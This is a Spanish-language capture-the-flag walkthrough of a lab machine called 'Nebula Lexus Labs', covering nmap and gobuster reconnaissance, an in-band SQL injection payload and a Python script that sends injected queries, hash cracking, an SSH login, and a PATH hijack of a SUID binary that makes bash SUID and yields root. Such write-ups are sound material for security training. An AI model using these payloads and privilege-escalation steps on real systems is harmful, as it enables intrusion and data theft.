---------
- Tags: #information-leakage #sqli-inband #path-hijacking z
--------
## Tecnicas utilizadas
- Information Leakege
- SQL injection In-Band
- Path Hijacking
## Reconocmiento

Un escaneo breve con **nmap** nos muestra los siguientes puertos abiertos:

```ruby
# nmap -sCV -p22,80 192.168.100.194 -oN Ports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-03 10:47 PST
Nmap scan report for 192.168.100.194
Host is up (0.00048s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 63:9c:2e:57:91:af:1e:2e:25:ba:55:fd:ba:48:a8:60 (RSA)
|   256 d0:05:24:1d:a8:99:0e:d6:d1:e5:c5:5b:40:6a:b9:f9 (ECDSA)
|_  256 d8:4a:b8:86:9d:66:6d:7f:a4:cb:d0:73:a1:f4:b5:19 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Nebula Lexus Labs
MAC Address: 08:00:27:80:AF:2C (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.92 seconds
```

Un analisis rapido sobre el sitio web con **WhatWeb** muestra las siguientes tecnologías corriendo por detrás:

```ruby
# whatweb 192.168.100.194
http://192.168.100.194 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[192.168.100.194], Script, Title[Nebula Lexus Labs]
```

La pagina principal nos recibe con esta breve introduccion la cual nos da una idea de a que se dedica la empresa:

![[Pasted image 20240103105635.png]]

Tenemos una seccion para iniciar sesión, como aún no contamos con credenciales previas, no podemos intentar nada. Sin embargo, podriamos intentar una inyeccion SQL pero me adelanto en que esto no funcionara:

![[Pasted image 20240103110102.png]]

Aplicando un poco de fuzzing por directorios web encontramos estos nuevos directorios que de antes no teniamos:

```ruby
# gobuster dir -u "http://192.168.100.194/" -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.194/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 316] [--> http://192.168.100.194/img/]
/login                (Status: 301) [Size: 318] [--> http://192.168.100.194/login/]
/joinus               (Status: 301) [Size: 319] [--> http://192.168.100.194/joinus/]
/server-status        (Status: 403) [Size: 280]
Progress: 220560 / 220561 (100.00%)
```

## Information Leakage

La direccion **/joinus** en cuestion es esta:

![[Pasted image 20240103110449.png]]

Nos da otra breve bienvenida y nos explica que si queremos entrar a la organizacion tenemos que llenar el formulario de ingreso.
El formulario nos muestra un dominio que podemos contemplar en el /etc/hosts para intentar hacer un fuzzing de subdominios:

![[Pasted image 20240103111138.png]]

Sin embargo, tampoco tenemos mucho exito. Si hacemos memoria, anteriormente observamos un **Login** en la pagina principal, asi que podriamos intentar logearnos:

![[Pasted image 20240103111502.png]]

Nos logueamos con exito en lo que parece ser un panel de administración:

![[Pasted image 20240103111538.png]]

Si vamos a la sección de Search Centrals encontramos una tabla con supuestos usuarios del sitio:

![[Pasted image 20240103111830.png]]

## SQL injection In-Band

Podemos observar que en la URL hace alucion a un `id=1` si colocamos un `id=1' or 1=1-- -` se nos mostraran todos los usuarios existentes, esto quiere decir que es vulnerable a SQL injection:

![[Pasted image 20240103112104.png]]

Para hacer este proceso más facil haremos uso de **BurpSuite**, desde aqui confirmaremos la inyeccion gracias a una consulta la cual mostrara nuestros numeros en la tabla:

![[Pasted image 20240103112451.png]]

Desde aqui, podemos empezar a montar un script en python para facilitarnos la inyeccion

```python
#/usr/bin/env python3

import requests
import sys
import signal
import re
import time

# Variables globales
url = "http://192.168.100.194/login/search_central.php?id=100' "

# Ctrl + C
def def_handler(sig, frame):
    print("\n[+] Saliendo...\n")
    sys.exit(1)
signal.signal(signal.SIGINT, def_handler)

def querySQLi():
    
    query = ""
    while query != "exit":
        query = input("\n[+] Introduce la query: ")
        return query

def SQLi():
    
    query = querySQLi()
    Sqli_url = url + query + "-- -"
    r = requests.get(Sqli_url)
    regex = re.findall(r"<td align='center'> (.*?)</td>", r.text)[0]
    print("\n[+] Resultado:\n")
    print(regex)

def main():
    SQLi()

if __name__ == "__main__":
    main()
```

Encontramos las siguientes base de datos existentes:

![[Pasted image 20240103114915.png]]

Dentro de la base de datos tenemos las siguientes tablas:

![[Pasted image 20240103115002.png]]

De primeras, la que nos llama la atencion es la de nombre "Users". Esta tiene las siguientes columnas:

![[Pasted image 20240103115057.png]]

Tenemos los siguientes usuarios con sus respectivos hashes que intentaremos crackear:

![[Pasted image 20240103115211.png]]

De todos los hashes que existen, solo llegamos a crackear el siguiente:

![[Pasted image 20240103115352.png]]

Estas credenciales nos serviran para iniciar sesión por SSH:
```ruby
# ssh pmccentral@192.168.100.194
The authenticity of host '192.168.100.194 (192.168.100.194)' can't be established.
ED25519 key fingerprint is SHA256:lRKWYnLnEJzjemn5JYjJt2RtIVPmtSp7S8Gg1XjrvWg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.100.194' (ED25519) to the list of known hosts.
pmccentral@192.168.100.194's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-169-generic x86_64)
<DATA>
...
</DATA>

pmccentral@laboratoryuser:~$ 
```

Listando los privilegios que tenemos asignados a nivel de sudoers encontramos los siguientes:

![[Pasted image 20240103115815.png]]

Podemos ganar una shell como laboratoryadmin de la siguiente manera:

![[Pasted image 20240103115921.png]]


Una enumeracion basica del sistema nos muestra que existe un script con privilegios SUID:
```ruby
laboratoryadmin@laboratoryuser:/home/pmccentral$ find / -perm -4000 2>/dev/null
<DATA>
...
</DATA>
/home/laboratoryadmin/autoScripts/PMCEmployees
```

## Path Hijacking

Al hacerlo un string al Binario vemos que hace uso del comando UNIX **Head** pero sin espeficiar la ruta absoluta:
```
laboratoryadmin@laboratoryuser:/home/pmccentral$ strings /home/laboratoryadmin/autoScripts/PMCEmployees
<DATA>
</DATA>
head /home/pmccentral/documents/employees.txt
<DATA>
</DATA>
```

Esto puede conducir al secuestro del path, para hacerlo crearemos un archivo en el directorio /tmp/ con el nombre de head el cual asignara SUID a la bash:

![[Pasted image 20240103120927.png]]

Ahora, al volver a ejecutarlo veremos que no nos muestra nada, sin embargo,, la bash ya tiene SUID:

![[Pasted image 20240103121017.png]]

Nos migramos a root con `$ bash -p` y ahora podremos listar la flag de root:

![[Pasted image 20240103121132.png]]


